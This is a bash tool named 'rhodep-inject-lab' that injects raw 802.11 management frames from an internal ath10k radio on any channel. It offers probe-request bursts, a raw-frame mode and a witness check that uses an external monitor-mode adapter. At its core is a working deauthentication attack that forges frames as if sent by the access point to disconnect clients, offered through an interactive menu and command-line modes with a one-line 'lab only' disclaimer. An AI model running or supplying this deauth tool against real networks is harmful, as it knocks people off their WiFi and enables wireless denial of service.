#!/bin/bash
# rhodep-inject-lab: inject 802.11 management frames on ANY channel from the
# INTERNAL WiFi radio (ath10k/WCN3990), via the STA vdev offchannel/ROC path.
# For your OWN networks / lab only.
#
# This WORKS on this device (verified over the air with an external witness):
# the internal radio transmits probe/auth/deauth/etc. on a chosen channel while
# wlan0 stays associated — it does NOT drop your WiFi. The one hardware limit is
# that the frame's source address (addr2/SA) is forced to wlan0's own MAC
# (cfg80211 does not allow spoofing the transmitter on ath10k); addr1 (dest) and
# addr3 (BSSID) are free.
#
# Modes:
#   sudo rhodep-inject-lab            # interactive menu
#   sudo rhodep-inject-lab probe  <freq> [dest] [bssid] [count]
#   sudo rhodep-inject-lab deauth <freq>  <dest>  <bssid> [count] [reason]
#   sudo rhodep-inject-lab raw    <freq> <hexframe> [count]
#   sudo rhodep-inject-lab witness <freq>            # verify OTA with TP-Link
# (intentionally no set -e/-u: never abort mid-run.)

TX=/usr/local/sbin/nl80211-mgmt-tx.py
[ -f "$TX" ] || TX=/tmp/nl80211-mgmt-tx.py
IF=wlan0

c_b=$'\e[1m'; c_g=$'\e[32m'; c_y=$'\e[33m'; c_r=$'\e[31m'; c_c=$'\e[36m'; c_0=$'\e[0m'

need_root(){ [ "$(id -u)" = 0 ] || { echo "run with sudo: sudo rhodep-inject-lab"; exit 1; }; }
selfmac(){ cat /sys/class/net/$IF/address 2>/dev/null; }
selfhex(){ selfmac | tr -d ':'; }
clean(){ printf '%s' "$1" | tr -d ': ' | tr 'A-F' 'a-f'; }

# freq(MHz) from a 2.4/5GHz channel number
ch2freq(){ local c=$1; if [ "$c" -le 14 ]; then echo $((2407 + c*5)); else echo $((5000 + c*5)); fi; }

tx_frame(){ # $1=freq $2=hexframe $3=count
	local freq="$1" frame="$2" count="${3:-10}" ok=0 i
	need_root
	local self; self=$(selfmac)
	echo "${c_c}TX${c_0} freq=$freq count=$count SA(forced)=$self len=$(( ${#frame} / 2 ))B"
	dmesg -C >/dev/null 2>&1
	for i in $(seq 1 "$count"); do
		python3 "$TX" "$IF" "$freq" "$frame" 200 >/dev/null 2>&1 && ok=$((ok+1))
		sleep 0.1
	done
	local st; st=$(dmesg 2>/dev/null | grep mgmt-tx-compl | grep -oE 'status=[0-9]+' | sort | uniq -c | tr '\n' ' ')
	echo "  accepted-by-kernel: $ok/$count   fw-completions: ${st:-none}"
	echo "  ${c_y}status=0 = firmware transmitted; no completion = mac80211 dropped it (e.g. spoofed SA)${c_0}"
}

mk_probe(){  # $1=dest $2=bssid   -> hex probe-request from our MAC
	local dst bss self; dst=$(clean "${1:-ffffffffffff}"); bss=$(clean "${2:-$dst}"); self=$(selfhex)
	echo "40000000${dst}${self}${bss}00000000010182"
}
mk_deauth(){ # $1=dest $2=bssid $3=reason  -> hex deauth SPOOFED as if from the AP
	# addr2/SA is spoofed = BSSID (needs kernel patch 0118: AUTH_AND_DEAUTH_RANDOM_TA
	# ext-feature). Clients accept a deauth "from the AP" and disconnect; our own
	# MAC as SA is ignored (class-3-from-nonauthenticated-STA).
	local dst bss r; dst=$(clean "$1"); bss=$(clean "$2")
	r=$(printf '%02x00' "${3:-7}")
	echo "c0000000${dst}${bss}${bss}0000${r}"
}
mk_deauth_own(){ # variant with our real MAC as SA (mostly useless — client ignores)
	local dst bss self r; dst=$(clean "$1"); bss=$(clean "$2"); self=$(selfhex)
	r=$(printf '%02x00' "${3:-7}")
	echo "c0000000${dst}${self}${bss}0000${r}"
}

witness(){ # $1=freq  -- set TP-Link as monitor, inject, confirm OTA
	need_root
	local freq="${1:?usage: witness <freq>}"
	local self; self=$(selfmac)
	# find the external phy (not wlan0's)
	local intphy extphy p
	intphy=$(basename "$(readlink -f /sys/class/net/$IF/phy80211 2>/dev/null)")
	for p in /sys/class/ieee80211/*; do [ "$(basename "$p")" != "$intphy" ] && extphy=$(basename "$p"); done
	if [ -z "$extphy" ]; then echo "${c_r}no external adapter (TP-Link) found — plug it in (otg on)${c_0}"; return 1; fi
	echo "witness on $extphy, injecting from $IF ($intphy) at freq $freq"
	# tear any netdev on extphy, make a monitor
	for d in $(for x in /sys/class/net/*/phy80211; do [ -e "$x" ] && [ "$(basename "$(readlink -f "$x")")" = "$extphy" ] && basename "$(dirname "$x")"; done); do
		ip link set "$d" down 2>/dev/null; iw dev "$d" del 2>/dev/null
	done
	iw phy "$extphy" interface add wit1 type monitor 2>/dev/null
	ip link set wit1 up 2>/dev/null
	sleep 1
	iw dev wit1 set freq "$freq" 2>/dev/null
	sleep 1
	# confirm the witness really landed on the channel
	echo "witness now: $(iw dev wit1 info 2>/dev/null | awk '/channel/{print}')"
	local san; san=$(timeout 5 tcpdump -i wit1 -nn "type mgt subtype beacon" 2>/dev/null | wc -l)
	echo "witness sanity beacons(5s): $san $( [ "$san" -gt 0 ] && echo OK || echo '(WARN: witness heard nothing — retrying channel)')"
	if [ "$san" -le 2 ]; then
		# retry setting the channel (rtw sometimes needs a second nudge)
		iw dev wit1 set freq "$freq" 2>/dev/null; sleep 1
		san=$(timeout 5 tcpdump -i wit1 -nn "type mgt subtype beacon" 2>/dev/null | wc -l)
		echo "witness sanity retry: $san"
	fi
	local cap=/tmp/rhodep-inject-witness.pcap; rm -f "$cap"
	timeout 15 tcpdump -i wit1 -w "$cap" -s0 "wlan addr2 $self" 2>/dev/null & local cp=$!
	sleep 1
	tx_frame "$freq" "$(mk_probe ffffffffffff)" 30
	sleep 2; kill "$cp" 2>/dev/null; pkill -9 tcpdump 2>/dev/null; sleep 1
	local heard; heard=$(tcpdump -r "$cap" -nn 2>/dev/null | wc -l)
	echo ""
	if [ "$heard" -gt 0 ]; then
		echo "${c_g}>>> OTA CONFIRMED: witness heard $heard of our frames on freq $freq.${c_0}"
		echo "    Internal-radio injection on an arbitrary channel WORKS."
	else
		echo "${c_y}>>> Witness heard 0 of our frames (sanity beacons=$san).${c_0}"
	fi
	# restore external to managed
	ip link set wit1 down 2>/dev/null; iw dev wit1 del 2>/dev/null
	iw phy "$extphy" interface add wlan1 type managed 2>/dev/null
	echo "witness pcap: $cap"
}

check_random_ta(){
	# best-effort: warn if patch 0118 is not in the running kernel. There's no
	# clean userspace way to query ext-features per driver, so we probe by
	# trying a spoofed-SA deauth and seeing if the kernel accepts it.
	local self ap fake_frame
	self=$(selfhex); ap="000000000001"
	fake_frame="c0000000ffffffffffff${ap}${ap}00000700"
	if python3 "$TX" "$IF" 2412 "$fake_frame" 50 >/dev/null 2>&1; then
		return 0
	fi
	echo "${c_y}NOTE: the kernel rejected a spoofed-SA test frame — patch 0118 may not be applied.${c_0}"
	echo "      deauth attacks will still 'send' but with SA = our own MAC, which clients ignore."
	return 1
}

menu(){
	need_root
	echo "${c_b}rhodep-inject-lab${c_0}  (internal radio: $(selfmac))"
	echo "wlan0 assoc: $(iw dev $IF link 2>/dev/null | awk '/Connected/{print $3}')"
	echo "Transmits on any channel WITHOUT dropping your WiFi (STA offchannel path)."
	check_random_ta
	echo
	echo "  1) probe-request burst"
	echo "  2) deauth burst (spoofed as the AP — needs patch 0118)"
	echo "  3) send a raw hex frame"
	echo "  4) verify over-the-air with the TP-Link"
	read -rp "choice: " ch
	read -rp "channel number (e.g. 11, or 36 for 5GHz): " cn
	local freq; freq=$(ch2freq "$cn")
	case "$ch" in
	  1) read -rp "target BSSID (blank=broadcast): " b; tx_frame "$freq" "$(mk_probe ffffffffffff "$b")" 20 ;;
	  2) read -rp "target client/DA MAC (blank=broadcast): " d
	     read -rp "AP BSSID: " b
	     [ -z "$d" ] && d="ffffffffffff"
	     [ -z "$b" ] && { echo "AP BSSID is required"; return; }
	     echo "sending 40 deauth bursts (DA=$d SA=BSSID=$b reason=7) on $cn ..."
	     tx_frame "$freq" "$(mk_deauth "$d" "$b" 7)" 40 ;;
	  3) read -rp "hex frame: " f; tx_frame "$freq" "$(clean "$f")" 10 ;;
	  4) witness "$freq" ;;
	  *) echo "invalid";;
	esac
}

need_root
cmd="${1:-menu}"; shift 2>/dev/null
case "$cmd" in
	menu)    menu ;;
	probe)   freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1")
	         tx_frame "$freq" "$(mk_probe "${2:-ffffffffffff}" "${3:-}")" "${4:-20}" ;;
	deauth)  freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1")
	         tx_frame "$freq" "$(mk_deauth "$2" "$3" "${5:-7}")" "${4:-20}" ;;
	raw)     freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1")
	         tx_frame "$freq" "$(clean "$2")" "${3:-10}" ;;
	witness) freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1"); witness "$freq" ;;
	*) echo "usage: rhodep-inject-lab [menu|probe|deauth|raw|witness] ..."; exit 1;;
esac
